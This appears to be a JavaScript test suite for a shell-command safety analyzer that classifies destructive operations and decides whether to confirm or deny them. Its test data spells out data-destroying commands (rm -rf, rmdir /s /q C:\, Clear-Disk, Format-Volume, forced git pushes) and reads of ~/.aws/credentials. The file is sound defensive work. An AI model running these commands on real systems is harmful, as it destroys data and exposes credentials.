import assert from 'node:assert/strict'
import fs from 'node:fs/promises'
import os from 'node:os'
import path from 'node:path'
import test from 'node:test'
import { resolveCommand } from '../src/adapter/analysis/commands.js'
import { createExecutionAnalyzer } from '../src/adapter/analysis/index.js'
import { collectEvidence } from '../src/adapter/evidence/index.js'
import { decide } from '../src/core/decision.js'

function command(executable, args, unit = {}) {
  const operations = []
  const children = []
  const candidates = []
  const gaps = []
  const commands = []
  const base = { context: { domain: 'host', platform: 'linux', cwd: '/fixture' }, origin: { entry: 'fixture' }, ...unit }
  const env = {
    operation(action, target, options) { operations.push({ action, target, ...options }) },
    child(input) {
      children.push(input)
      // Mirrors the pipeline: argv children re-enter the catalog with their own context.
      if (input.source?.kind === 'argv' && typeof input.source.executable === 'string') {
        resolveCommand(input.source.executable, input.source.args, { ...base, ...input }, env)
      }
    },
    candidate(kind, reason, knownScope) { candidates.push({ kind, reason, knownScope }) },
    gap(kind) { gaps.push(kind) },
    // Mirrors the pipeline env.command: nested command facts re-enter the catalog.
    command(name, commandArgs, opts = {}) { resolveCommand(name, commandArgs, { ...base, ...opts }, env) },
    step() {},
  }
  resolveCommand(executable, args, base, env)
  return { operations, children, candidates, gaps, commands }
}

test('recursive deletion identifies the subtree, including a bounded wildcard base', () => {
  const direct = command('rm', ['-r', '--', 'build'])
  assert.deepEqual(direct.operations[0].target, { kind: 'subtree', root: 'build' })
  const pattern = command('rm', ['-r', '--', 'build/*.txt'], { patterns: [false, false, true] })
  assert.deepEqual(pattern.operations[0].target, { kind: 'pattern', base: '/fixture/build', pattern: '*.txt', dialect: 'posix' })
})

test('PowerShell separates a literal operand, pattern and preview', () => {
  const literal = command('Remove-Item', ['-LiteralPath', '*.txt', '-WhatIf:$false'], { powershell: true })
  assert.deepEqual(literal.operations[0].target, { kind: 'exact', paths: ['*.txt'] })
  assert.equal(literal.operations[0].preview, false)
  const preview = command('Remove-Item', ['-Path', '*.txt', '-WhatIf'], { powershell: true })
  assert.equal(preview.operations[0].preview, true)
  assert.equal(preview.operations[0].target.kind, 'pattern')
})

test('storage cmdlets report selectors as evidence requests and honor preview', () => {
  const unit = { powershell: true, context: { domain: 'host', platform: 'win32', cwd: 'C:\\fixture' } }
  const operation = command('Clear-Disk', ['-Number', '0'], unit).operations[0]
  assert.deepEqual(operation.details, { deviceMutation: { diskNumber: 0 } })
  assert.equal(command('Format-Volume', ['-DriveLetter', 'C', '-WhatIf'], unit).operations.length, 0)
  assert.equal(command('Clear-Disk', ['-Number', null], unit).candidates[0].kind, 'unverified-effect')
})

test('Git preview only follows a recognized option before the terminator', () => {
  const preview = command('git', ['clean', '-ndx'])
  assert.equal(preview.operations[0].preview, true)
  const ordinary = command('git', ['clean', '-fd', '--', '-n'])
  assert.equal(ordinary.operations[0].preview, false)
  assert.equal(command('git', ['push', '--dry-run', '--force']).operations[0].preview, true)
  assert.equal(command('git', ['push', 'origin', 'HEAD:main']).operations.length, 0)
  assert.equal(command('git', ['push', 'origin', ':obsolete']).operations[0].action, 'git-history-destroy')
})

test('cat line-number switch does not consume the file operand', () => {
  const result = command('cat', ['-n', 'fixture.txt'])
  assert.deepEqual(result.operations[0].target, { kind: 'exact', paths: ['fixture.txt'] })
})

test('raw output commands emit write intent only for the destination', () => {
  const write = command('dd', ['if=source.img', 'of=destination.img']).operations[0]
  assert.equal(write.action, 'write-content')
  assert.deepEqual(write.target.paths, ['destination.img'])
  const truncate = command('truncate', ['--size', '0', '--', 'fixture.txt']).operations[0]
  assert.equal(truncate.action, 'truncate-content')
  assert.deepEqual(truncate.target.paths, ['fixture.txt'])
})

test('WSL retains explicit distribution, user and cwd without inheriting host paths', () => {
  const result = command('wsl.exe', ['-d', 'Fixture', '-u', 'runner', '--cd', '/fixture', '--exec', 'bash', 'example.sh'], {
    context: { domain: 'host', platform: 'win32', cwd: 'C:\\fixture' },
  })
  assert.deepEqual(result.children[0].context, { domain: 'wsl', platform: 'linux', cwd: '/fixture', user: 'runner', distribution: 'Fixture' })
  assert.deepEqual(result.children[0].source, { kind: 'argv', executable: 'bash', args: ['example.sh'] })
})

// --- coverage additions: find (F-01/F-02) -------------------------------------

test('find -delete scopes the matched pattern to the find root', () => {
  const direct = command('find', ['.', '-name', '*.log', '-delete'])
  assert.equal(direct.operations[0].action, 'delete')
  assert.deepEqual(direct.operations[0].target, { kind: 'pattern', base: '/fixture', pattern: '*.log', dialect: 'posix' })
  assert.equal(direct.operations[0].recursive, true)
  const absolute = command('find', ['/var/log', '-maxdepth', '2', '-name', '*.tmp', '-delete'])
  assert.deepEqual(absolute.operations[0].target, { kind: 'pattern', base: '/var/log', pattern: '*.tmp', dialect: 'posix' })
})

test('find delete with an unresolvable root keeps knownScope', () => {
  const result = command('find', ['relative-dir', '-delete'], { context: { domain: 'host', platform: 'linux' } })
  assert.deepEqual(result.operations[0].target, { kind: 'unknown', reason: 'find-base-unresolved', knownScope: ['relative-dir'] })
})

test('find without a destructive action stays untouched', () => {
  for (const args of [['.', '-name', '*.ts'], ['/tmp', '-maxdepth', '1', '-type', 'd'], ['.', '-name', '*.log', '-print']]) {
    const result = command('find', args)
    assert.deepEqual(result.operations, [], JSON.stringify(args))
    assert.deepEqual(result.candidates, [], JSON.stringify(args))
  }
})

test('find -exec rm becomes a dynamic deletion with the find root as scope', () => {
  const plus = command('find', ['.', '-exec', 'rm', '-rf', '{}', '+'])
  assert.equal(plus.operations[0].action, 'delete')
  assert.deepEqual(plus.operations[0].target, { kind: 'unknown', reason: 'find-exec-targets', knownScope: ['/fixture'] })
  const escaped = command('find', ['.', '-name', '*.tmp', '-exec', 'rm', '-f', '{}', null])
  assert.deepEqual(escaped.operations[0].target, { kind: 'unknown', reason: 'find-exec-targets', knownScope: ['/fixture'] })
  assert.deepEqual(escaped.gaps, [])
})

test('find -exec of other programs or prompts never deletes', () => {
  const listing = command('find', ['.', '-exec', 'ls', '{}', '+'])
  assert.deepEqual(listing.operations, [])
  assert.ok(listing.gaps.includes('unmodeled-command'))
  assert.deepEqual(command('find', ['.', '-exec', 'echo', '{}', ';']).operations, [])
  const interactive = command('find', ['.', '-exec', 'rm', '-i', '{}', ';'])
  assert.deepEqual(interactive.operations, [])
  assert.ok(interactive.gaps.includes('command-options'))
})

/** Decision-level check over harness operations: run the evidence adapter and the
 * pure decision point without touching the fixture filesystem. */
async function decideOperations(operations, candidates = []) {
  const evidence = await collectEvidence(
    { status: 'complete', operations, candidates, gaps: [] },
    { isProtectedPath: () => false },
  )
  return decide(evidence, {})
}

/** Full-pipeline driver for the DSR-031 additions: real analyzer + real decide.
 * The inventory is the empty exact set, so these assertions depend only on the
 * operation/candidate contract, not on fixture filesystem contents. */
const PIPELINE_CONTEXT = { domain: 'host', cwd: process.cwd(), platform: process.platform }
const EMPTY_INVENTORY = { kind: 'exact', count: 0, files: [], links: [], directories: [], roots: [], unknown: [] }
const pipelineAnalyzer = createExecutionAnalyzer()
test.after(() => pipelineAnalyzer.dispose())

async function evaluatePipeline(text, { language = 'bash' } = {}) {
  const analysis = await pipelineAnalyzer.analyze({
    source: { kind: 'inline', text }, language, context: PIPELINE_CONTEXT, origin: { entry: 'target-command' },
  })
  const decision = decide({
    analysisStatus: analysis.status,
    operations: analysis.operations,
    candidates: analysis.candidates,
    gaps: analysis.gaps,
    identities: [],
    inventory: EMPTY_INVENTORY,
    protectedHits: [],
    exemptions: [],
    issues: [],
  }, {})
  return { analysis, decision }
}

test('find with a dynamic predicate keeps the start scope and confirms dynamically', async () => {
  const result = command('find', ['.', '-name', null, '-delete'])
  assert.equal(result.operations[0].action, 'delete')
  assert.deepEqual(result.operations[0].target, { kind: 'unknown', reason: 'find-predicate-unresolved', knownScope: ['/fixture'] })
  assert.equal(result.operations[0].recursive, true)
  assert.deepEqual(result.candidates, [])
  const decision = await decideOperations(result.operations)
  assert.equal(decision.kind, 'confirm')
  assert.equal(decision.ruleId, 'data.delete.dynamic')
})

test('find with a dynamic start point becomes an unverified-effect candidate', async () => {
  const result = command('find', [null, '-name', '*.log', '-delete'])
  assert.deepEqual(result.operations, [])
  assert.equal(result.candidates[0]?.kind, 'unverified-effect')
  assert.equal(result.candidates[0]?.knownScope, undefined)
  const decision = await decideOperations(result.operations, result.candidates)
  assert.equal(decision.kind, 'deny')
  assert.equal(decision.ruleId, 'execution.unverified-effect')
})

test('find deletion tiers survive the scope fallback (regression)', async () => {
  const pattern = command('find', ['.', '-name', '*.log', '-delete'])
  assert.deepEqual(pattern.operations[0].target, { kind: 'pattern', base: '/fixture', pattern: '*.log', dialect: 'posix' })
  const decision = await decideOperations(pattern.operations)
  assert.equal(decision.kind, 'confirm')
  assert.equal(decision.ruleId, 'data.delete.dynamic')
  const plain = command('find', ['.', '-name', '*.ts'])
  assert.deepEqual(plain.operations, [])
  assert.deepEqual(plain.candidates, [])
})

// --- coverage additions: xargs / parallel (F-03, D5) ---------------------------

test('xargs and parallel with a literal destructive argv keep the stream scope', () => {
  const piped = command('xargs', ['rm', '-rf'])
  assert.equal(piped.operations[0].action, 'delete')
  assert.deepEqual(piped.operations[0].target, { kind: 'unknown', reason: 'stream-fed-targets', knownScope: ['stdin stream', 'rm -rf'] })
  const parallel = command('parallel', ['rm', '-rf', ':::', 'a', 'b'])
  assert.deepEqual(parallel.operations[0].target, { kind: 'unknown', reason: 'stream-fed-targets', knownScope: ['stdin stream', 'rm -rf'] })
  const forced = command('xargs', ['-0', 'rm', '-f'])
  assert.deepEqual(forced.operations[0].target.knownScope, ['stdin stream', 'rm -f'])
})

test('xargs and parallel never treat dynamic or read-only inner commands as deletions', () => {
  for (const [name, args] of [['xargs', ['echo']], ['xargs', ['wc', '-l']], ['parallel', ['ls', ':::', 'a', 'b']]]) {
    const result = command(name, args)
    assert.deepEqual(result.operations, [], JSON.stringify(args))
    assert.deepEqual(result.candidates, [], JSON.stringify(args))
  }
  const dynamic = command('xargs', [null, '-rf'])
  assert.deepEqual(dynamic.operations, [])
  assert.deepEqual(dynamic.candidates, [])
  assert.ok(dynamic.gaps.includes('unmodeled-command'))
})

// --- coverage additions: shred (F-04, lead ruling) ------------------------------

test('shred always tiers as a deletion and lookup forms stay untouched', () => {
  assert.deepEqual(command('shred', ['-u', 'secret.txt']).operations[0].target, { kind: 'exact', paths: ['secret.txt'] })
  assert.deepEqual(command('shred', ['-fzu', 'note.md']).operations[0].target, { kind: 'exact', paths: ['note.md'] })
  assert.deepEqual(command('shred', ['-n', '1', 'file']).operations[0].target, { kind: 'exact', paths: ['file'] })
  assert.deepEqual(command('shred', ['--help']).operations, [])
  assert.deepEqual(command('shred', ['--help']).gaps, [])
  assert.deepEqual(command('shred', ['-n', '1']).gaps, ['command-options'])
  assert.deepEqual(command('shred', []).gaps, ['command-options'])
})

// --- coverage additions: rsync (F-05) -------------------------------------------

test('rsync --delete models the destination tree and honors -n', () => {
  const direct = command('rsync', ['-a', '--delete', 'src/', 'dst/'])
  assert.equal(direct.operations[0].action, 'delete')
  assert.deepEqual(direct.operations[0].target, { kind: 'subtree', root: 'dst/' })
  assert.equal(direct.operations[0].recursive, true)
  assert.deepEqual(direct.operations[0].details, { rsyncDelete: true })
  assert.deepEqual(command('rsync', ['--delete-during', 'src/', 'dst/']).operations[0].target, { kind: 'subtree', root: 'dst/' })
  assert.equal(command('rsync', ['-n', '--delete', 'src/', 'dst/']).operations[0].preview, true)
})

test('rsync without a delete flag or help output never deletes', () => {
  const plain = command('rsync', ['-a', 'src/', 'dst/'])
  assert.deepEqual(plain.operations, [])
  assert.deepEqual(plain.candidates, [])
  const help = command('rsync', ['--help'])
  assert.deepEqual(help.operations, [])
  assert.deepEqual(help.gaps, [])
})

// --- coverage additions: transparent wrappers (F-06, D5) ------------------------

test('transparent wrappers unwrap to the inner command without extra candidates', () => {
  for (const argv of [
    ['sudo', 'rm', '-rf', 'X'],
    ['timeout', '5', 'rm', '-rf', 'X'],
    ['nohup', 'rm', '-rf', 'X'],
    ['env', 'FOO=1', 'rm', '-rf', 'X'],
    ['command', 'rm', '-rf', 'X'],
    ['exec', 'rm', '-rf', 'X'],
    ['nice', '-n', '1', 'rm', '-rf', 'X'],
    ['stdbuf', '-oL', 'rm', '-rf', 'X'],
    ['sudo', 'env', 'FOO=1', 'timeout', '5', 'rm', '-rf', 'X'],
  ]) {
    const result = command(argv[0], argv.slice(1))
    assert.equal(result.operations[0]?.action, 'delete', JSON.stringify(argv))
    assert.deepEqual(result.operations[0]?.target, { kind: 'subtree', root: 'X' }, JSON.stringify(argv))
    assert.deepEqual(result.candidates, [], JSON.stringify(argv))
  }
})

test('wrapper chains with a dynamic inner program stay a gap without candidates', () => {
  const dynamic = command('sudo', [null, 'rm', '-rf', 'X'])
  assert.deepEqual(dynamic.operations, [])
  assert.deepEqual(dynamic.candidates, [])
  assert.ok(dynamic.gaps.includes('unmodeled-command'))
  const lookup = command('command', ['-v', 'rm'])
  assert.deepEqual(lookup.operations, [])
  assert.deepEqual(lookup.gaps, [])
})

test('non-destructive wrapper usage never produces operations or candidates', () => {
  for (const [name, args] of [['sudo', ['ls']], ['timeout', ['5', 'sleep', '1']], ['env', ['FOO=1', 'make']], ['command', ['echo', 'hi']]]) {
    const result = command(name, args)
    assert.deepEqual(result.operations, [], JSON.stringify(args))
    assert.deepEqual(result.candidates, [], JSON.stringify(args))
  }
})

// --- coverage additions: cmd inline (F-09..F-11) ---------------------------------

test('cmd inline delete family is modeled with cmd semantics', () => {
  const rmdir = command('cmd', ['/c', 'rmdir', '/s', '/q', 'build'])
  assert.equal(rmdir.operations[0].action, 'delete')
  assert.deepEqual(rmdir.operations[0].target, { kind: 'subtree', root: 'build' })
  assert.equal(rmdir.operations[0].recursive, true)
  assert.deepEqual(command('cmd', ['/c', 'rd', '/s', '/q', 'C:\\tmp\\x']).operations[0].target, { kind: 'subtree', root: 'C:\\tmp\\x' })
  assert.deepEqual(command('cmd', ['/c', 'rmdir', '/s', '/q', 'C:\\']).operations[0].target, { kind: 'subtree', root: 'C:\\' })
  assert.deepEqual(command('cmd', ['/c', 'del', '/f', '/q', 'a.txt']).operations[0].target, { kind: 'exact', paths: ['a.txt'] })
  const recursive = command('cmd', ['/c', 'del', '/s', '/q', '*.log'])
  assert.equal(recursive.operations[0].target.kind, 'unknown')
  assert.deepEqual(recursive.operations[0].target.knownScope, ['files matching *.log in the working directory tree (del /s)'])
  assert.deepEqual(command('cmd', ['/c', 'del', 'a.txt']).operations[0].target, { kind: 'exact', paths: ['a.txt'] })
  const segments = command('cmd', ['/c', 'del a.txt & del b.txt'])
  assert.deepEqual(segments.operations.map((op) => op.target.paths[0]), ['a.txt', 'b.txt'])
})

test('unmodeled cmd text stays a gap and never deletes', () => {
  // `/k` without a body is the bare interactive prompt: no text, no fact.
  for (const args of [['/c', 'echo', 'hi'], ['/c', 'dir', 'C:\\'], ['/c', 'ver'], ['/k'], []]) {
    const result = command('cmd', args)
    assert.deepEqual(result.operations, [], JSON.stringify(args))
    assert.deepEqual(result.candidates, [], JSON.stringify(args))
    assert.ok(result.gaps.includes('cmd-inline'), JSON.stringify(args))
  }
  const help = command('cmd', ['/c', 'del', '/?'])
  assert.deepEqual(help.operations, [])
  assert.ok(help.gaps.includes('command-options'))
})

// --- coverage additions: git subcommands (F-12..F-18) ----------------------------

test('git rm without --cached deletes worktree paths', () => {
  const recursive = command('git', ['rm', '-r', 'src/legacy'])
  assert.deepEqual(recursive.operations[0].target, { kind: 'subtree', root: 'src/legacy' })
  assert.equal(recursive.operations[0].recursive, true)
  assert.deepEqual(command('git', ['rm', 'a.txt', 'b.txt']).operations[0].target, { kind: 'exact', paths: ['a.txt', 'b.txt'] })
  assert.equal(command('git', ['rm', '-r', '--cached', '.']).operations.length, 0)
  assert.equal(command('git', ['rm', '-n', 'src/legacy']).operations.length, 0)
  assert.equal(command('git', ['rm']).operations.length, 0)
})

test('git branch -D reports the ref scope while tag -d is a reference-only deletion', () => {
  const branch = command('git', ['branch', '-D', 'feature'])
  assert.equal(branch.operations[0].action, 'git-restore')
  assert.deepEqual(branch.operations[0].target, { kind: 'unknown', reason: 'git-ref-scope', knownScope: ['refs/heads/feature'] })
  assert.equal(branch.operations[0].details.command, 'branch')
  // Deleting a tag removes only a reference; no commit or working-tree state is lost.
  assert.deepEqual(command('git', ['tag', '-d', 'v1.0.0']).operations, [])
  assert.deepEqual(command('git', ['tag', '--delete', 'v1.0.0']).operations, [])
  for (const args of [['branch', '-d', 'merged-branch'], ['branch', 'newfeat'], ['branch'], ['branch', '-a'],
    ['tag', 'v1.2.0'], ['tag'], ['tag', '-l']]) {
    assert.deepEqual(command('git', args).operations, [], JSON.stringify(args))
  }
})

test('git push --delete of tag refs is reference cleanup, not history destruction', () => {
  // Explicit tag refs only remove references; no commit or worktree is destroyed.
  assert.deepEqual(command('git', ['push', 'origin', '--delete', 'refs/tags/v1.0.0']).operations, [])
  assert.deepEqual(command('git', ['push', '--delete', 'origin', 'refs/tags/v1.0.0', 'refs/tags/v2.0.0']).operations, [])
  // A bare name is ambiguous (it can resolve to a branch) and refs/heads/* is a branch
  // ref, so both stay in the catastrophic history-destroy tier; a mixture stays too.
  assert.equal(command('git', ['push', 'origin', '--delete', 'v1.0.0']).operations[0].action, 'git-history-destroy')
  assert.equal(command('git', ['push', 'origin', '--delete', 'refs/heads/main']).operations[0].action, 'git-history-destroy')
  assert.equal(command('git', ['push', 'origin', '--delete', 'refs/tags/v1', 'refs/heads/main']).operations[0].action, 'git-history-destroy')
  // The short alias `-d` (and combined short clusters such as `-fd`) follow the same
  // ref-type rule: explicit tag refs are reference cleanup, anything else stays dangerous.
  assert.deepEqual(command('git', ['push', '-d', 'origin', 'refs/tags/v1']).operations, [])
  assert.equal(command('git', ['push', '-d', 'origin', 'main']).operations[0].action, 'git-history-destroy')
  assert.equal(command('git', ['push', '-d', 'origin', 'refs/heads/main']).operations[0].action, 'git-history-destroy')
  assert.deepEqual(command('git', ['push', '-fd', 'origin', 'refs/tags/v1']).operations, [])
  assert.equal(command('git', ['push', '-fd', 'origin', 'main']).operations[0].action, 'git-history-destroy')
  assert.equal(command('git', ['push', '-df', 'origin', 'refs/heads/main']).operations[0].action, 'git-history-destroy')
  // A force attached to a tag-only deletion is still reference cleanup (deleting a tag ref
  // destroys no commit); --mirror remains dangerous because it mirrors and deletes all refs.
  assert.deepEqual(command('git', ['push', '--force', '--delete', 'origin', 'refs/tags/v1']).operations, [])
  assert.deepEqual(command('git', ['push', '--force-with-lease', '--delete', 'origin', 'refs/tags/v1']).operations, [])
  assert.deepEqual(command('git', ['push', '-f', '--delete', 'origin', 'refs/tags/v1']).operations, [])
  assert.equal(command('git', ['push', '--force', '--delete', 'origin', 'refs/heads/main']).operations[0].action, 'git-history-destroy')
  assert.equal(command('git', ['push', '--mirror', 'origin']).operations[0].action, 'git-history-destroy')
  // Other dangerous push forms are unchanged.
  assert.equal(command('git', ['push', 'origin', '--force']).operations[0].action, 'git-history-destroy')
  assert.equal(command('git', ['push', 'origin', '--mirror']).operations[0].action, 'git-history-destroy')
  assert.equal(command('git', ['push', '--force-with-lease', 'origin', 'main']).operations[0].action, 'git-history-destroy')
  // --dry-run keeps its preview semantics.
  const preview = command('git', ['push', '--dry-run', 'origin', '--force'])
  assert.equal(preview.operations[0].preview, true)
  assert.equal(preview.operations[0].action, 'git-history-destroy')
})

test('git checkout discards are scoped by pathspec or state', () => {
  assert.deepEqual(command('git', ['checkout', '--', 'src/a.js']).operations[0].target, { kind: 'exact', paths: ['src/a.js'] })
  assert.deepEqual(command('git', ['checkout', 'HEAD', '--', 'src/app.ts']).operations[0].target, { kind: 'exact', paths: ['src/app.ts'] })
  const force = command('git', ['checkout', '--force', 'other-branch'])
  assert.equal(force.operations[0].action, 'git-restore')
  assert.deepEqual(force.operations[0].target, {
    kind: 'unknown', reason: 'git-state-scope',
    knownScope: ['working tree (branch switch discards local changes)'],
  })
  assert.equal(command('git', ['checkout', '-f', 'main']).operations.length, 1)
  for (const args of [['checkout', 'main'], ['checkout', '-b', 'newfeat'], ['checkout', '--orphan', 'x'],
    ['checkout', '--force', '--merge', 'main'], ['switch', 'main'], ['switch', '-c', 'feat'],
    ['reset'], ['reset', '--soft', 'HEAD~1']]) {
    assert.deepEqual(command('git', args).operations, [], JSON.stringify(args))
  }
})

test('git switch --discard-changes and reset --merge report the state scope', () => {
  const sw = command('git', ['switch', '--discard-changes', 'main'])
  assert.deepEqual(sw.operations[0].target, {
    kind: 'unknown', reason: 'git-state-scope',
    knownScope: ['working tree (branch switch discards local changes)'],
  })
  assert.equal(sw.operations[0].details.command, 'switch')
  assert.deepEqual(command('git', ['switch', '--force', 'main']).operations[0].target.reason, 'git-state-scope')
  const reset = command('git', ['reset', '--merge', 'HEAD~1'])
  assert.deepEqual(reset.operations[0].target, { kind: 'unknown', reason: 'git-state-scope', knownScope: ['merge state / uncommitted changes'] })
  assert.equal(reset.operations[0].details.command, 'reset')
  assert.equal(command('git', ['reset', '--merge']).operations.length, 1)
  // Existing behavior regression guards (D6).
  assert.equal(command('git', ['merge', '--ff-only', 'main']).operations.length, 0)
  assert.equal(command('git', ['reflog']).operations.length, 0)
  assert.equal(command('git', ['status']).operations.length, 0)
  assert.equal(command('git', ['reset', '--hard']).operations[0].action, 'git-history-destroy')
})

// --- coverage additions: tilde (F-24) ---------------------------------------------

test('tilde operands expand to the host home directory', () => {
  const home = os.homedir()
  const win = { context: { domain: 'host', platform: 'win32', cwd: 'C:\\fixture' } }
  const remove = command('rm', ['-rf', '~/proj'], win)
  assert.deepEqual(remove.operations[0].target, { kind: 'subtree', root: path.win32.join(home, 'proj') })
  const read = command('Get-Content', ['~/.aws/credentials'], { ...win, powershell: true })
  assert.equal(read.operations[0].action, 'read-content')
  assert.deepEqual(read.operations[0].target, { kind: 'exact', paths: [path.win32.join(home, '.aws', 'credentials')] })
  const posix = command('cat', ['~/.aws/credentials'])
  assert.deepEqual(posix.operations[0].target, { kind: 'exact', paths: [path.posix.join(home, '.aws', 'credentials')] })
})

test('tilde-user forms and a quoted tilde never expand to the home directory', () => {
  const user = command('rm', ['-rf', '~bob/x'])
  assert.ok(user.gaps.includes('tilde-user'))
  assert.equal(user.operations[0].target.kind, 'unknown')
  const quoted = command('cat', ['~/.aws/credentials'], {
    context: { domain: 'host', platform: 'linux', cwd: '/fixture' },
    literalOperands: [true],
  })
  assert.deepEqual(quoted.operations[0].target, { kind: 'exact', paths: ['~/.aws/credentials'] })
})

// --- coverage additions: non-host domain (F-33, D2) -------------------------------

test('non-host domain deletions avoid host targets and list the domain scope', () => {
  const wsl = command('rm', ['-rf', '/tmp/x'], { context: { domain: 'wsl', platform: 'linux', cwd: '/tmp' } })
  assert.deepEqual(wsl.operations[0].target, { kind: 'unknown', reason: 'non-host-domain', knownScope: ['wsl: /tmp/x (recursive)'] })
  const exact = command('rm', ['a.txt', 'b.txt'], { context: { domain: 'wsl', platform: 'linux', cwd: '/tmp' } })
  assert.deepEqual(exact.operations[0].target, { kind: 'unknown', reason: 'non-host-domain', knownScope: ['wsl: a.txt', 'wsl: b.txt'] })
  const bare = command('rm', ['-rf'], { context: { domain: 'wsl', platform: 'linux', cwd: '/tmp' } })
  assert.deepEqual(bare.operations, [])
  assert.ok(bare.gaps.includes('command-options'))
  assert.deepEqual(command('rm', ['-rf', '/tmp/x']).operations[0].target, { kind: 'subtree', root: '/tmp/x' })
})

// --- coverage additions: wsl payload analysis (incident 2026-11-14) --------------

const win32Unit = { context: { domain: 'host', platform: 'win32', cwd: 'C:\\fixture' } }

test('wsl without --exec analyzes the distribution command line', () => {
  const direct = command('wsl', ['-d', 'Ubuntu', 'rm', '-rf', '/tmp/x'], win32Unit)
  assert.deepEqual(direct.children[0].context, { domain: 'wsl', platform: 'linux', distribution: 'Ubuntu' })
  assert.deepEqual(direct.children[0].source, { kind: 'argv', executable: 'rm', args: ['-rf', '/tmp/x'] })
  const shell = command('wsl', ['-d', 'Ubuntu', 'bash', '-lc', 'rsync -a --delete /mnt/e/src/ "$dst/"'], win32Unit)
  // The argv child re-enters the catalog, where the interpreter wrapper extracts
  // the inline script as a bash child unit inside the wsl domain.
  assert.deepEqual(shell.children[0].source, { kind: 'argv', executable: 'bash', args: ['-lc', 'rsync -a --delete /mnt/e/src/ "$dst/"'] })
  assert.equal(shell.children[1].source.kind, 'inline')
  assert.equal(shell.children[1].language, 'bash')
  assert.equal(shell.children[1].source.text, 'rsync -a --delete /mnt/e/src/ "$dst/"')
  assert.equal(shell.children[1].context.domain, 'wsl')
  const afterTerminator = command('wsl', ['--', 'rm', '-rf', '/tmp/x'], win32Unit)
  assert.deepEqual(afterTerminator.children[0].source, { kind: 'argv', executable: 'rm', args: ['-rf', '/tmp/x'] })
})

test('wsl management and query switches stay a coverage gap without operations', () => {
  for (const args of [['--list', '--verbose'], ['--shutdown'], ['--status'], ['--running'], ['--version'], ['-h'], ['-t', 'Ubuntu']]) {
    const result = command('wsl', args, win32Unit)
    assert.deepEqual(result.operations, [], JSON.stringify(args))
    assert.deepEqual(result.children, [], JSON.stringify(args))
    assert.deepEqual(result.candidates, [], JSON.stringify(args))
    assert.ok(result.gaps.includes('wsl-shell'), JSON.stringify(args))
  }
  const bare = command('wsl', [], win32Unit)
  assert.ok(bare.gaps.includes('wsl-shell'))
  assert.deepEqual(bare.operations, [])
})

test('wsl --unregister confirms the distribution deletion', async () => {
  const literal = command('wsl', ['--unregister', 'Ubuntu'], win32Unit)
  assert.equal(literal.operations[0].action, 'delete')
  assert.deepEqual(literal.operations[0].target, { kind: 'unknown', reason: 'wsl-distro-remove', knownScope: ['wsl --unregister Ubuntu'] })
  const decision = await decideOperations(literal.operations)
  assert.equal(decision.kind, 'confirm')
  assert.equal(decision.ruleId, 'data.delete.dynamic')
  const attached = command('wsl', ['--unregister=Ubuntu'], win32Unit)
  assert.deepEqual(attached.operations[0].target.knownScope, ['wsl --unregister Ubuntu'])
  // A dynamic distro name still identifies the deletion; the shape stays the scope.
  const dynamic = command('wsl', ['--unregister', null], win32Unit)
  assert.deepEqual(dynamic.operations[0].target, { kind: 'unknown', reason: 'wsl-distro-remove', knownScope: ['wsl --unregister (unresolved distribution)'] })
  // A bare call is a usage error: gap only, no fabricated confirmation.
  const bare = command('wsl', ['--unregister'], win32Unit)
  assert.deepEqual(bare.operations, [])
  assert.deepEqual(bare.candidates, [])
  assert.ok(bare.gaps.includes('wsl-shell'))
})

// --- coverage additions: rsync unresolvable destination (incident 2026-11-14) ----

test('rsync --delete with an unresolvable destination confirms on the command shape', () => {
  const dynamic = command('rsync', ['-a', '--delete', '/mnt/e/src/', null])
  assert.equal(dynamic.operations[0].action, 'delete')
  assert.deepEqual(dynamic.operations[0].target, {
    kind: 'unknown',
    reason: 'rsync-delete-target',
    knownScope: ['rsync --delete /mnt/e/src/ -> (unresolved destination expression)'],
  })
  assert.deepEqual(dynamic.operations[0].details, { rsyncDelete: true })
  // A dynamic source with a literal destination keeps the enumerable tier.
  const literal = command('rsync', ['--delete', null, '/tmp/build/'])
  assert.deepEqual(literal.operations[0].target, { kind: 'subtree', root: '/tmp/build/' })
  const preview = command('rsync', ['-n', '--delete', '/mnt/e/src/', null])
  assert.equal(preview.operations[0].preview, true)
})

// --- heredoc-fed stdin scripts --------------------------------------------------

test('a heredoc-fed POSIX shell interpreter analyzes the body as its script', () => {
  const body = 'rm -rf /tmp/x\n'
  const bash = command('bash', [], { heredocs: [{ operator: '<<', body }] })
  assert.equal(bash.children[0].source.kind, 'inline')
  assert.equal(bash.children[0].source.text, body)
  assert.equal(bash.children[0].language, 'bash')
  assert.equal(bash.children[0].context.domain, 'host')
  assert.deepEqual(bash.operations, [])
  const sh = command('sh', [], { heredocs: [{ operator: '<<-', body }] })
  assert.equal(sh.children[0].language, 'posix')
  for (const name of ['dash', 'zsh', 'ksh']) {
    const result = command(name, [], { heredocs: [{ operator: '<<', body }] })
    assert.equal(result.children[0].language, 'posix', name)
    assert.equal(result.children[0].source.text, body, name)
  }
  const stdio = command('bash', ['-s'], { heredocs: [{ operator: '<<', body }] })
  assert.equal(stdio.children[0].source.text, body)
  assert.deepEqual(stdio.gaps, [], '-s is the explicit stdin-script mode')
})

test('heredoc receiver options keep their unproven semantics as gaps', () => {
  const login = command('bash', ['--login'], { heredocs: [{ operator: '<<', body: 'echo hi\n' }] })
  assert.equal(login.children[0].source.text, 'echo hi\n')
  assert.deepEqual(login.gaps, ['shell-startup'])
  const unknown = command('bash', ['-v'], { heredocs: [{ operator: '<<', body: 'echo hi\n' }] })
  assert.deepEqual(unknown.gaps, ['interpreter-options'])
})

test('heredoc bodies stay data for non-shell receivers and inline scripts', () => {
  const cat = command('cat', [], { heredocs: [{ operator: '<<', body: 'rm -rf /tmp/x\n' }] })
  assert.deepEqual(cat.children, [])
  assert.deepEqual(cat.operations, [])
  const python = command('python', [], { heredocs: [{ operator: '<<', body: 'import os\n' }] })
  assert.deepEqual(python.children, [])
  assert.ok(python.gaps.includes('stdin-source'))
  // `-c` and a script file displace the stdin script: the heredoc stays data.
  const inline = command('bash', ['-c', 'echo hi'], { heredocs: [{ operator: '<<', body: 'rm -rf /tmp/x\n' }] })
  assert.equal(inline.children.length, 1)
  assert.equal(inline.children[0].source.text, 'echo hi')
  const file = command('bash', ['script.sh'], { heredocs: [{ operator: '<<', body: 'rm -rf /tmp/x\n' }] })
  assert.equal(file.children.length, 1)
  assert.equal(file.children[0].source.kind, 'file')
  // No extractable body keeps the old behavior.
  const none = command('bash', [])
  assert.deepEqual(none.children, [])
  assert.ok(none.gaps.includes('stdin-source'))
  const empty = command('bash', [], { heredocs: [{ operator: '<<', body: '' }] })
  assert.deepEqual(empty.children, [])
